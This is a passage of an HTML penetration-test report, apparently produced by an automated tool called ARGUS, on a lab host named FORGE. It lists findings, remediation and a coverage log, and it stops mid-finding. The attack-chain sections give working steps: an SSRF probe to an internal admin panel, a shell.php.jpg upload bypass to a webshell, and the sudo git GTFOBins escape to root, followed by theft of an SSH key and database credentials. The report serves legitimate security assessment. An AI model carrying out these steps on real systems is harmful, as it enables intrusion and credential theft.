+    <p style="font-size:13px;color:var(--text-muted);font-family:var(--font-mono)">
+      Attack chain: SSRF (T1190) &rarr; Upload bypass / Webshell (T1505.003) &rarr; RCE (T1059) &rarr; Sudo git privesc (T1548.003) &rarr; Root &rarr; Credential loot (T1003)
+    </p>
+  </div>
+  <h3 style="font-size:16px;font-weight:700;color:var(--text-primary);margin-bottom:16px">Priority Actions</h3>
+  <ul class="action-list">
+    <li class="action-item"><span class="action-num">1</span><div class="action-text"><strong>Immediately</strong> implement an egress allow-list on the internal fetch service to kill the SSRF root cause. Until patched, the internal admin panel is reachable from the web tier without authentication.</div></li>
+    <li class="action-item"><span class="action-num">2</span><div class="action-text"><strong>Enforce upload validation</strong> using MIME-type + magic-byte inspection and store all uploads off the web root on a noexec mount. The double-extension bypass was trivial and gave direct RCE.</div></li>
+    <li class="action-item"><span class="action-num">3</span><div class="action-text"><strong>Remove sudo NOPASSWD: /usr/bin/git</strong> immediately. Any www-data process (or lower-privilege attacker foothold) can use GTFOBins to reach root in seconds.</div></li>
+    <li class="action-item"><span class="action-num">4</span><div class="action-text"><strong>Rotate all leaked credentials</strong>: /root/.ssh/id_rsa (revoke + regenerate), DB credentials from config.php, and any secrets readable under the www-data or root context.</div></li>
+    <li class="action-item"><span class="action-num">5</span><div class="action-text"><strong>Patch Apache 2.4.41</strong>, enable CSP + HSTS + X-Frame-Options headers, disable the TRACE method, and HTML-encode the /search output to close the reflected XSS. Disable TLS 1.0/1.1.</div></li>
+  </ul>
+</section>
+<!-- SECTION 2: SYSTEM & SCOPE -->
+<section id="scope">
+  <div class="section-eyebrow"><span class="num">&sect;2</span> System &amp; Scope</div>
+  <h2 class="section-title">System &amp; <span class="accent">Scope</span></h2>
+  <div class="section-divider"></div>
+  <div class="scope-grid">
+    <div class="card">
+      <div class="card-header">Target Profile</div>
+      <table><tbody>
+        <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.1em;padding:7px 0;width:40%">Hostname</td><td style="font-family:var(--font-mono);font-size:12px;color:var(--cyan);padding:7px 0">FORGE</td></tr>
+        <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.1em;padding:7px 0">IP Address</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">10.129.21.254</td></tr>
+        <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.1em;padding:7px 0">OS</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">Ubuntu 20.04.4 LTS</td></tr>
+        <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.1em;padding:7px 0">Scope</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">Single host, web + infra</td></tr>
+        <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.1em;padding:7px 0">Engagement</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">Grey-box, time-boxed</td></tr>
+        <tr><td style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.1em;padding:7px 0">Auth Surface</td><td style="font-family:var(--font-mono);font-size:12px;padding:7px 0">Form login, SSH</td></tr>
+      </tbody></table>
+    </div>
+    <div class="card">
+      <div class="card-header">Trust Boundary Note</div>
+      <p style="font-size:13px;color:var(--text-secondary);line-height:1.7;margin-bottom:12px">
+        Untrusted web input reaches an internal fetch service with <strong style="color:var(--critical)">no egress allow-list</strong>. This is the root cause of the entire attack chain: the SSRF bridge from the public web tier to the internal admin panel on port 8080 was the initial pivot point.
+      </p>
+      <p style="font-family:var(--font-mono);font-size:11px;color:var(--text-muted)">
+        Determinism note: grey-box, time-boxed assessment. Absence of a finding in this report is not proof of absence of the vulnerability.
+      </p>
+    </div>
+  </div>
+  <h3 style="font-size:15px;font-weight:700;color:var(--text-primary);margin-bottom:16px">Open Ports &amp; Services</h3>
+  <div class="table-wrap" style="margin-bottom:24px">
+    <table>
+      <thead><tr><th>Port/Proto</th><th>Service</th><th>Version / Banner</th><th>Exposure</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td class="mono">22/tcp</td><td>OpenSSH</td><td class="mono">8.2p1 Ubuntu 4ubuntu0.5</td><td><span class="sev low">Public</span></td><td style="color:var(--text-muted);font-size:12px">Key-only for root; rate-limiting active</td></tr>
+        <tr><td class="mono">80/tcp</td><td>Apache httpd</td><td class="mono">2.4.41 (Ubuntu)</td><td><span class="sev critical">Public</span></td><td style="color:var(--text-muted);font-size:12px">Main attack surface; hosts /upload, /api/fetch, /search</td></tr>
+        <tr><td class="mono">8080/tcp</td><td>Werkzeug/Python</td><td class="mono">Werkzeug/2.0 Python/3.8</td><td><span class="sev critical">Internal only</span></td><td style="color:var(--text-muted);font-size:12px">Internal admin panel; reached via SSRF on :80</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="evidence-block"># nmap -sCV -p- 10.129.21.254 (excerpt)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+8080/tcp open  http    Werkzeug/2.0 Python/3.8.10
+|_ http-title: FORGE Internal Admin
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+</section>
+
+<!-- SECTION 3: METHODOLOGY -->
+<section id="method">
+  <div class="section-eyebrow"><span class="num">&sect;3</span> Methodology</div>
+  <h2 class="section-title">Methodology &amp; <span class="accent">CVSS Rubric</span></h2>
+  <div class="section-divider"></div>
+  <div class="scope-grid" style="margin-bottom:32px">
+    <div class="card">
+      <div class="card-header">Engagement Methodology</div>
+      <p style="font-size:13px;color:var(--text-secondary);line-height:1.8;margin-bottom:12px">
+        ARGUS operates a <strong style="color:var(--text-primary)">plan &rarr; execute &rarr; validate</strong> loop over a hypothesis tree. Each action is annotated with a MITRE ATT&amp;CK technique and produces an evidence chain before a finding is recorded.
+      </p>
+      <ul style="list-style:none;display:flex;flex-direction:column;gap:8px">
+        <li style="font-size:12px;color:var(--text-muted);padding-left:14px;position:relative"><span style="position:absolute;left:0;color:var(--cyan)">&#8227;</span>Findings ship only when grounded in concrete tool evidence (ARGUS Issue-Validator gate)</li>
+        <li style="font-size:12px;color:var(--text-muted);padding-left:14px;position:relative"><span style="position:absolute;left:0;color:var(--cyan)">&#8227;</span>Every exploitable path is re-confirmed on a dedicated retest pass</li>
+        <li style="font-size:12px;color:var(--text-muted);padding-left:14px;position:relative"><span style="position:absolute;left:0;color:var(--cyan)">&#8227;</span>Non-exploitable paths are documented as coverage (not omitted)</li>
+        <li style="font-size:12px;color:var(--text-muted);padding-left:14px;position:relative"><span style="position:absolute;left:0;color:var(--cyan)">&#8227;</span>All artifacts are integrity-hashed and stored in the secure evidence store</li>
+        <li style="font-size:12px;color:var(--text-muted);padding-left:14px;position:relative"><span style="position:absolute;left:0;color:var(--cyan)">&#8227;</span>Grey-box, time-boxed; absence of finding is not proof of absence</li>
+      </ul>
+    </div>
+    <div class="card">
+      <div class="card-header">CVSS v3.1 Scoring Rubric</div>
+      <div class="cvss-legend" style="margin-bottom:16px">
+        <div class="cvss-band c"><div class="cvss-band-label">Critical</div><div class="cvss-band-range">9.0 &ndash; 10.0</div></div>
+        <div class="cvss-band h"><div class="cvss-band-label">High</div><div class="cvss-band-range">7.0 &ndash; 8.9</div></div>
+        <div class="cvss-band m"><div class="cvss-band-label">Medium</div><div class="cvss-band-range">4.0 &ndash; 6.9</div></div>
+        <div class="cvss-band l"><div class="cvss-band-label">Low</div><div class="cvss-band-range">0.1 &ndash; 3.9</div></div>
+        <div class="cvss-band i"><div class="cvss-band-label">Info</div><div class="cvss-band-range">0.0</div></div>
+      </div>
+      <p style="font-size:12px;color:var(--text-muted);line-height:1.6">
+        Scores reflect base CVSS v3.1 vectors. Environmental modifiers applied where client context is known. All scores are independently calculated and peer-reviewed by the operator gate before report inclusion.
+      </p>
+    </div>
+  </div>
+</section>
+
+<!-- SECTION 4: ATTACK PATH / KILL CHAIN GRAPH -->
+<section id="killchain">
+  <div class="section-eyebrow"><span class="num">&sect;4</span> Attack Path</div>
+  <h2 class="section-title">Attack Path &amp; <span class="accent">Kill Chain</span></h2>
+  <div class="section-divider"></div>
+  <p class="section-lead">Full autonomous exploit chain from external attacker to root, confirmed on retest. Each node is colour-coded by MITRE tactic.</p>
+
+  <!-- INLINE SVG KILL CHAIN GRAPH -->
+  <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:10px;padding:32px;overflow-x:auto;margin-bottom:24px">
+  <svg viewBox="0 0 960 360" xmlns="http://www.w3.org/2000/svg" style="width:100%;min-width:700px;font-family:'JetBrains Mono',monospace">
+    <defs>
+      <marker id="arr" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+        <path d="M0,0 L0,6 L8,3 z" fill="#2e3447"/>
+      </marker>
+      <marker id="arr-red" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+        <path d="M0,0 L0,6 L8,3 z" fill="#ff3b5c"/>
+      </marker>
+      <marker id="arr-cyan" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+        <path d="M0,0 L0,6 L8,3 z" fill="#00d4ff"/>
+      </marker>
+      <filter id="glow-cyan"><feGaussianBlur stdDeviation="3" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+      <filter id="glow-red"><feGaussianBlur stdDeviation="4" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+    </defs>
+    <!-- Background grid lines -->
+    <line x1="0" y1="180" x2="960" y2="180" stroke="#1e2130" stroke-width="1" stroke-dasharray="4,8"/>
+
+    <!-- Node: External Attacker -->
+    <rect x="20" y="145" width="130" height="70" rx="6" fill="#1a1d25" stroke="#555e78" stroke-width="1.5"/>
+    <text x="85" y="170" text-anchor="middle" fill="#8b92a8" font-size="11" font-weight="600">EXTERNAL</text>
+    <text x="85" y="187" text-anchor="middle" fill="#8b92a8" font-size="11" font-weight="600">ATTACKER</text>
+    <text x="85" y="205" text-anchor="middle" fill="#555e78" font-size="9">Internet</text>
+
+    <!-- Arrow 1 -->
+    <line x1="150" y1="180" x2="188" y2="180" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr-cyan)"/>
+
+    <!-- Node: SSRF -->
+    <rect x="190" y="138" width="140" height="84" rx="6" fill="#161920" stroke="#00d4ff" stroke-width="1.5" filter="url(#glow-cyan)"/>
+    <text x="260" y="162" text-anchor="middle" fill="#00d4ff" font-size="9" font-weight="700">T1190 &bull; INITIAL ACCESS</text>
+    <text x="260" y="180" text-anchor="middle" fill="#e8eaf0" font-size="11" font-weight="700">SSRF</text>
+    <text x="260" y="196" text-anchor="middle" fill="#8b92a8" font-size="10">/api/fetch?url=</text>
+    <text x="260" y="212" text-anchor="middle" fill="#555e78" font-size="9">FORGE:80</text>
+
+    <!-- Arrow 2 -->
+    <line x1="330" y1="180" x2="368" y2="180" stroke="#00d4ff" stroke-width="1.5" marker-end="url(#arr-cyan)"/>
+
+    <!-- Node: Internal Admin -->
+    <rect x="370" y="138" width="140" height="84" rx="6" fill="#161920" stroke="#8b5cf6" stroke-width="1.5"/>
+    <text x="440" y="162" text-anchor="middle" fill="#8b5cf6" font-size="9" font-weight="700">PIVOT</text>
+    <text x="440" y="180" text-anchor="middle" fill="#e8eaf0" font-size="11" font-weight="700">Internal Admin</text>
+    <text x="440" y="196" text-anchor="middle" fill="#8b92a8" font-size="10">127.0.0.1:8080</text>
+    <text x="440" y="212" text-anchor="middle" fill="#555e78" font-size="9">Werkzeug / Python</text>
+
+    <!-- Arrow 3 -->
+    <line x1="510" y1="180" x2="548" y2="180" stroke="#ff6b2b" stroke-width="1.5" marker-end="url(#arr-red)"/>
+
+    <!-- Node: Upload Bypass / Webshell -->
+    <rect x="550" y="130" width="150" height="100" rx="6" fill="#161920" stroke="#ff6b2b" stroke-width="1.5"/>
+    <text x="625" y="155" text-anchor="middle" fill="#ff6b2b" font-size="9" font-weight="700">T1505.003 &bull; PERSIST</text>
+    <text x="625" y="173" text-anchor="middle" fill="#e8eaf0" font-size="11" font-weight="700">Upload Bypass</text>
+    <text x="625" y="190" text-anchor="middle" fill="#e8eaf0" font-size="11" font-weight="700">&rarr; Webshell</text>
+    <text x="625" y="207" text-anchor="middle" fill="#8b92a8" font-size="10">shell.php.jpg magic</text>
+    <text x="625" y="222" text-anchor="middle" fill="#555e78" font-size="9">/uploads/shell.php</text>
+
+    <!-- Arrow 4 -->
+    <line x1="700" y1="180" x2="738" y2="180" stroke="#ff3b5c" stroke-width="2" marker-end="url(#arr-red)"/>
+
+    <!-- Node: RCE / Foothold -->
+    <rect x="740" y="130" width="140" height="100" rx="6" fill="#1a0810" stroke="#ff3b5c" stroke-width="2" filter="url(#glow-red)"/>
+    <text x="810" y="155" text-anchor="middle" fill="#ff3b5c" font-size="9" font-weight="700">T1059 &bull; EXECUTION</text>
+    <text x="810" y="173" text-anchor="middle" fill="#e8eaf0" font-size="12" font-weight="700">RCE</text>
+    <text x="810" y="190" text-anchor="middle" fill="#ff3b5c" font-size="11" font-weight="700">www-data</text>
+    <text x="810" y="207" text-anchor="middle" fill="#8b92a8" font-size="10">FOOTHOLD</text>
+    <text x="810" y="222" text-anchor="middle" fill="#555e78" font-size="9">uid=33(www-data)</text>
+
+    <!-- Arrow 5 - down then right for privesc -->
+    <path d="M 810 230 L 810 290 L 625 290 L 625 310" stroke="#ff3b5c" stroke-width="1.5" fill="none" stroke-dasharray="5,3" marker-end="url(#arr-red)"/>
+
+    <!-- Node: Sudo Git Privesc -->
+    <rect x="530" y="310" width="190" height="42" rx="6" fill="#1a0810" stroke="#ff3b5c" stroke-width="2" filter="url(#glow-red)"/>
+    <text x="625" y="327" text-anchor="middle" fill="#ff6b2b" font-size="9" font-weight="700">T1548.003 &bull; PRIV-ESC</text>
+    <text x="625" y="343" text-anchor="middle" fill="#e8eaf0" font-size="11" font-weight="700">sudo git GTFOBins &rarr; ROOT</text>
+
+    <!-- Arrow 6 loot -->
+    <path d="M 530 331 L 430 331" stroke="#ff3b5c" stroke-width="1.5" fill="none" marker-end="url(#arr-red)"/>
+
+    <!-- Node: Loot -->
+    <rect x="260" y="310" width="168" height="42" rx="6" fill="#161920" stroke="#f59e0b" stroke-width="1.5"/>
+    <text x="344" y="327" text-anchor="middle" fill="#f59e0b" font-size="9" font-weight="700">T1003 &bull; CRED ACCESS</text>
+    <text x="344" y="343" text-anchor="middle" fill="#e8eaf0" font-size="11" font-weight="700">Loot: id_rsa + creds</text>
+
+    <!-- Labels top -->
+    <text x="85" y="130" text-anchor="middle" fill="#3a4058" font-size="9">STAGE 0</text>
+    <text x="260" y="130" text-anchor="middle" fill="#3a4058" font-size="9">STAGE 1</text>
+    <text x="440" y="130" text-anchor="middle" fill="#3a4058" font-size="9">STAGE 2</text>
+    <text x="625" y="122" text-anchor="middle" fill="#3a4058" font-size="9">STAGE 3</text>
+    <text x="810" y="122" text-anchor="middle" fill="#3a4058" font-size="9">STAGE 4</text>
+    <text x="625" y="305" text-anchor="middle" fill="#3a4058" font-size="9">STAGE 5</text>
+    <text x="344" y="305" text-anchor="middle" fill="#3a4058" font-size="9">STAGE 6</text>
+
+    <!-- Legend row -->
+    <rect x="20" y="10" width="10" height="10" rx="2" fill="#00d4ff"/>
+    <text x="35" y="20" fill="#8b92a8" font-size="9">Initial Access / Pivot</text>
+    <rect x="160" y="10" width="10" height="10" rx="2" fill="#8b5cf6"/>
+    <text x="175" y="20" fill="#8b92a8" font-size="9">Discovery</text>
+    <rect x="260" y="10" width="10" height="10" rx="2" fill="#ff6b2b"/>
+    <text x="275" y="20" fill="#8b92a8" font-size="9">Persistence</text>
+    <rect x="370" y="10" width="10" height="10" rx="2" fill="#ff3b5c"/>
+    <text x="385" y="20" fill="#8b92a8" font-size="9">Execution / PrivEsc</text>
+    <rect x="510" y="10" width="10" height="10" rx="2" fill="#f59e0b"/>
+    <text x="525" y="20" fill="#8b92a8" font-size="9">Credential Access</text>
+  </svg>
+  </div>
+  <div class="card">
+    <div class="card-header">Kill Chain Narrative</div>
+    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px">
+      <div><div style="font-family:var(--font-mono);font-size:10px;color:var(--cyan);margin-bottom:6px">STAGE 1 &mdash; T1190 SSRF</div><p style="font-size:12px;color:var(--text-secondary);line-height:1.6">Probed <code style="color:var(--cyan)">/api/fetch?url=</code> with an internal loopback URL. No allow-list; the service faithfully fetched <code style="color:var(--cyan)">http://127.0.0.1:8080</code> and returned the internal admin HTML.</p></div>
+      <div><div style="font-family:var(--font-mono);font-size:10px;color:var(--high);margin-bottom:6px">STAGE 2 &mdash; T1505.003 Upload Bypass</div><p style="font-size:12px;color:var(--text-secondary);line-height:1.6">The internal admin panel exposed <code style="color:var(--cyan)">/upload</code>. A double-extension file (<code style="color:var(--cyan)">shell.php.jpg</code>) with a PHP magic-byte header bypassed the content filter; the webshell was written to <code style="color:var(--cyan)">/uploads/</code>.</p></div>
+      <div><div style="font-family:var(--font-mono);font-size:10px;color:var(--critical);margin-bottom:6px">STAGE 3 &mdash; T1059 Webshell RCE</div><p style="font-size:12px;color:var(--text-secondary);line-height:1.6">HTTP request to the uploaded shell with <code style="color:var(--cyan)">cmd=id</code> returned <code style="color:var(--cyan)">uid=33(www-data)</code>. Interactive shell established. LinPEAS surfaced the sudo misconfiguration.</p></div>
+      <div><div style="font-family:var(--font-mono);font-size:10px;color:var(--critical);margin-bottom:6px">STAGE 4 &mdash; T1548.003 Sudo GTFOBins</div><p style="font-size:12px;color:var(--text-secondary);line-height:1.6"><code style="color:var(--cyan)">sudo -l</code> revealed <code style="color:var(--cyan)">NOPASSWD: /usr/bin/git</code>. Invoked <code style="color:var(--cyan)">sudo git -p help config</code> then <code style="color:var(--cyan)">!/bin/sh</code> to break out to a root shell.</p></div>
+      <div><div style="font-family:var(--font-mono);font-size:10px;color:var(--medium);margin-bottom:6px">STAGE 5 &mdash; T1003 Credential Access</div><p style="font-size:12px;color:var(--text-secondary);line-height:1.6">As root: read <code style="color:var(--cyan)">/root/root.txt</code>, exfiltrated <code style="color:var(--cyan)">/root/.ssh/id_rsa</code>, and retrieved DB credentials from <code style="color:var(--cyan)">/var/www/app/config.php</code>.</p></div>
+    </div>
+  </div>
+</section>
+<!-- SECTION 5: ATTACKS ATTEMPTED COVERAGE LOG -->
+<section id="attacks">
+  <div class="section-eyebrow"><span class="num">&sect;5</span> Coverage Log</div>
+  <h2 class="section-title">Attacks Attempted &mdash; <span class="accent">Coverage</span></h2>
+  <div class="section-divider"></div>
+  <p class="section-lead">Every technique attempted during the engagement, including non-exploitable paths. Coverage transparency is a core ARGUS principle.</p>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>#</th><th>Technique / Tool</th><th>Outcome</th><th>Exploitable</th><th>Evidence Note</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td class="mono">01</td>
+          <td style="font-size:12px;color:var(--text-primary)">nmap -sCV full TCP scan</td>
+          <td><span class="outcome-success">SUCCESS</span></td>
+          <td style="color:var(--text-muted);font-size:11px">Recon only</td>
+          <td style="font-size:11px;color:var(--text-muted)">3 open ports; service versions fingerprinted</td>
+        </tr>
+        <tr>
+          <td class="mono">02</td>
+          <td style="font-size:12px;color:var(--text-primary)">gobuster dir /</td>
+          <td><span class="outcome-success">SUCCESS</span></td>
+          <td style="color:var(--text-muted);font-size:11px">Recon only</td>
+          <td style="font-size:11px;color:var(--text-muted)">/admin (403), /upload, /api, /search discovered</td>
+        </tr>
+        <tr>
+          <td class="mono">03</td>
+          <td style="font-size:12px;color:var(--text-primary)">nikto web scan</td>
+          <td><span class="outcome-success">SUCCESS</span></td>
+          <td style="color:var(--text-muted);font-size:11px">Intel / F-04</td>
+          <td style="font-size:11px;color:var(--text-muted)">Apache 2.4.41 outdated, missing headers, TRACE enabled</td>
+        </tr>
+        <tr style="background:rgba(107,114,128,0.04)">
+          <td class="mono">04</td>
+          <td style="font-size:12px;color:var(--text-primary)">sqlmap /api?id= (5 techniques, ~1.2k req)</td>
+          <td><span class="outcome-negative">NEGATIVE</span></td>
+          <td><span class="sev info" style="font-size:9px">NON-EXPLOIT</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">Parameter is integer-cast server-side; not injectable</td>
+        </tr>
+        <tr style="background:rgba(107,114,128,0.04)">
+          <td class="mono">05</td>
+          <td style="font-size:12px;color:var(--text-primary)">hydra ssh root (top-1000 wordlist)</td>
+          <td><span class="outcome-negative">BLOCKED</span></td>
+          <td><span class="sev info" style="font-size:9px">NON-EXPLOIT</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">SSH rate-limits active; root requires key-only auth</td>
+        </tr>
+        <tr style="background:rgba(107,114,128,0.04)">
+          <td class="mono">06</td>
+          <td style="font-size:12px;color:var(--text-primary)">Default credential spray on /login</td>
+          <td><span class="outcome-negative">FAILED</span></td>
+          <td><span class="sev info" style="font-size:9px">NON-EXPLOIT</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">No default credentials accepted (admin/admin, etc.)</td>
+        </tr>
+        <tr style="background:rgba(107,114,128,0.04)">
+          <td class="mono">07</td>
+          <td style="font-size:12px;color:var(--text-primary)">CSRF test on state-changing forms</td>
+          <td><span class="outcome-negative">NEGATIVE</span></td>
+          <td><span class="sev info" style="font-size:9px">NON-EXPLOIT</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">Anti-CSRF tokens present and server-validated</td>
+        </tr>
+        <tr style="background:rgba(255,59,92,0.03)">
+          <td class="mono">08</td>
+          <td style="font-size:12px;color:var(--text-primary)">SSRF probe /api/fetch?url=</td>
+          <td><span class="outcome-exploitable">EXPLOITABLE</span></td>
+          <td><span class="sev critical">Critical</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">Reached 127.0.0.1:8080 internal admin; no allow-list &rarr; F-01</td>
+        </tr>
+        <tr style="background:rgba(255,59,92,0.03)">
+          <td class="mono">09</td>
+          <td style="font-size:12px;color:var(--text-primary)">Upload filter bypass (double-ext + magic bytes)</td>
+          <td><span class="outcome-exploitable">EXPLOITABLE</span></td>
+          <td><span class="sev critical">Critical</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">shell.php.jpg written to /uploads; webshell active &rarr; F-02</td>
+        </tr>
+        <tr style="background:rgba(255,59,92,0.03)">
+          <td class="mono">10</td>
+          <td style="font-size:12px;color:var(--text-primary)">Webshell RCE &rarr; id</td>
+          <td><span class="outcome-exploitable">EXPLOITABLE</span></td>
+          <td><span class="sev critical">Critical</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">uid=33(www-data); /etc/passwd read; foothold confirmed</td>
+        </tr>
+        <tr style="background:rgba(255,59,92,0.03)">
+          <td class="mono">11</td>
+          <td style="font-size:12px;color:var(--text-primary)">LinPEAS automated enumeration</td>
+          <td><span class="outcome-exploitable">EXPLOITABLE LEAD</span></td>
+          <td><span class="sev high">High</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">Surfaced sudo NOPASSWD: /usr/bin/git &rarr; F-03</td>
+        </tr>
+        <tr style="background:rgba(255,59,92,0.03)">
+          <td class="mono">12</td>
+          <td style="font-size:12px;color:var(--text-primary)">GTFOBins: sudo git -p help &rarr; !/bin/sh</td>
+          <td><span class="outcome-exploitable">EXPLOITABLE</span></td>
+          <td><span class="sev critical">Critical</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">uid=0(root); root.txt + id_rsa captured &rarr; F-03</td>
+        </tr>
+        <tr style="background:rgba(245,158,11,0.03)">
+          <td class="mono">13</td>
+          <td style="font-size:12px;color:var(--text-primary)">Reflected XSS /search?q=</td>
+          <td><span class="outcome-exploitable">EXPLOITABLE</span></td>
+          <td><span class="sev medium">Medium</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">&lt;script&gt; reflected unencoded in response &rarr; F-05</td>
+        </tr>
+        <tr>
+          <td class="mono">14</td>
+          <td style="font-size:12px;color:var(--text-primary)">TLS scan (testssl.sh)</td>
+          <td><span class="outcome-success">SUCCESS</span></td>
+          <td><span class="sev low">Low</span></td>
+          <td style="font-size:11px;color:var(--text-muted)">TLS 1.0 &amp; 1.1 still enabled &rarr; F-08</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- SECTION 6: FINDINGS REGISTER -->
+<section id="register">
+  <div class="section-eyebrow"><span class="num">&sect;6</span> Findings Register</div>
+  <h2 class="section-title">Findings <span class="accent">Register</span></h2>
+  <div class="section-divider"></div>
+  <div class="table-wrap">
+    <table>
+      <thead>
+        <tr><th>ID</th><th>Finding</th><th>Severity</th><th>CVSS</th><th>Host</th><th>MITRE</th><th>Retest</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><span class="finding-id">F-01</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">SSRF to internal admin panel</td>
+          <td><span class="sev critical">Critical</span></td>
+          <td><span class="cvss-score cvss-critical">9.1</span></td>
+          <td class="mono">FORGE:80</td>
+          <td><span class="mitre-tag">T1190</span></td>
+          <td><span class="status verified">Verified</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-02</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">Unauthenticated file-upload &rarr; RCE (webshell)</td>
+          <td><span class="sev critical">Critical</span></td>
+          <td><span class="cvss-score cvss-critical">9.8</span></td>
+          <td class="mono">FORGE:80</td>
+          <td><span class="mitre-tag">T1505.003</span> <span class="mitre-tag" style="margin-left:4px">T1059</span></td>
+          <td><span class="status verified">Verified</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-03</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">Sudo misconfiguration (git GTFOBins) &rarr; root</td>
+          <td><span class="sev high">High</span></td>
+          <td><span class="cvss-score cvss-high">8.8</span></td>
+          <td class="mono">FORGE</td>
+          <td><span class="mitre-tag">T1548.003</span></td>
+          <td><span class="status verified">Verified</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-04</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">Outdated Apache 2.4.41 (multiple CVEs)</td>
+          <td><span class="sev high">High</span></td>
+          <td><span class="cvss-score cvss-high">7.5</span></td>
+          <td class="mono">FORGE:80</td>
+          <td style="color:var(--text-muted);font-size:11px">N/A</td>
+          <td><span class="status open">Open</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-05</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">Reflected XSS on /search</td>
+          <td><span class="sev medium">Medium</span></td>
+          <td><span class="cvss-score cvss-medium">6.1</span></td>
+          <td class="mono">FORGE:80</td>
+          <td><span class="mitre-tag">T1059.007</span></td>
+          <td><span class="status verified">Verified</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-06</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">Missing security headers (CSP / HSTS / X-Frame)</td>
+          <td><span class="sev medium">Medium</span></td>
+          <td><span class="cvss-score cvss-medium">5.3</span></td>
+          <td class="mono">FORGE:80</td>
+          <td style="color:var(--text-muted);font-size:11px">N/A</td>
+          <td><span class="status open">Open</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-07</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">HTTP TRACE method enabled</td>
+          <td><span class="sev medium">Medium</span></td>
+          <td><span class="cvss-score cvss-medium">4.8</span></td>
+          <td class="mono">FORGE:80</td>
+          <td style="color:var(--text-muted);font-size:11px">N/A</td>
+          <td><span class="status open">Open</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-08</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">TLS 1.0 / 1.1 enabled</td>
+          <td><span class="sev low">Low</span></td>
+          <td><span class="cvss-score cvss-low">3.7</span></td>
+          <td class="mono">FORGE:443</td>
+          <td style="color:var(--text-muted);font-size:11px">N/A</td>
+          <td><span class="status open">Open</span></td>
+        </tr>
+        <tr>
+          <td><span class="finding-id">F-09</span></td>
+          <td style="font-size:12px;color:var(--text-primary);font-weight:500">Verbose server / version banners</td>
+          <td><span class="sev low">Low</span></td>
+          <td><span class="cvss-score cvss-low">3.1</span></td>
+          <td class="mono">FORGE</td>
+          <td style="color:var(--text-muted);font-size:11px">N/A</td>
+          <td><span class="status open">Open</span></td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+<!-- SECTION 7: DETAILED FINDING CARDS -->
+<section id="findings">
+  <div class="section-eyebrow"><span class="num">&sect;7</span> Detailed Findings</div>
+  <h2 class="section-title">Detailed <span class="accent">Finding Cards</span></h2>
+  <div class="section-divider"></div>
+
+  <!-- F-01 -->
+  <div class="finding-card">
+    <div class="finding-card-header">
+      <span class="finding-card-id">F-01</span>
+      <span class="sev critical">Critical</span>
+      <span class="finding-card-title">Server-Side Request Forgery (SSRF) to Internal Admin Panel</span>
+      <span class="cvss-score cvss-critical">CVSS 9.1</span>
+      <span class="status verified">Verified</span>
+    </div>
+    <div class="finding-card-body">
+      <div>
+        <div class="finding-field">
+          <div class="finding-field-label">Description</div>
